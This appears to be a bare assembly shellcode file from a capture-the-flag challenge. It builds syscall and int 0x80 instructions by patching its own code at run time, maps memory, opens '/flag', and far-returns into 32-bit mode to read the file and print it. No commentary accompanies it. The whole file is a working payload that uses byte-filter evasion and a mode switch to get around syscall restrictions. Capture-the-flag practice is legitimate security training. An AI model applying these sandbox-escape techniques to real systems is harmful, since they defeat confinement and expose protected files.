    BITS 64
    DEFAULT REL
    global _start

    FLAG equ 0x1337331337
    FIXUP equ 0x3400000000

_start:
    mov al, 0x0f
    mov ah, 0x05
    mov word [_sys64], ax

    mov al, 0xcd
    mov ah, 0x80
    lea rdx, _sys32
    mov rcx, FIXUP
    sub rdx, rcx
    mov word [rdx], ax

    mov eax, 9
    mov rdi, FLAG & ~0xfff
    mov esi, 0x1000
    mov edx, 2
    mov r10, 0x32
    mov r8, -1
    mov r9, 0
    call _sys64

    mov rax, `/flag`
    mov rdi, FLAG
    mov qword [rdi], rax

    mov eax, 2
    xor esi, esi
    call _sys64

    push code32
    mov dword [rsp + 4], 0x23
    retf

_sys64:
    dw 0x6969
    ret

    BITS 32

code32:
    lea esp, _stack_end

    mov eax, 3
    mov ebx, 3
    mov ecx, esp
    mov edx, 0x40
    call _sys32

    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x40
    call _sys32

    mov eax, 1
    mov ebx, 137
    call _sys32

_sys32:
    dw 0x6969
    ret

_stack:
    times 128 nop
_stack_end: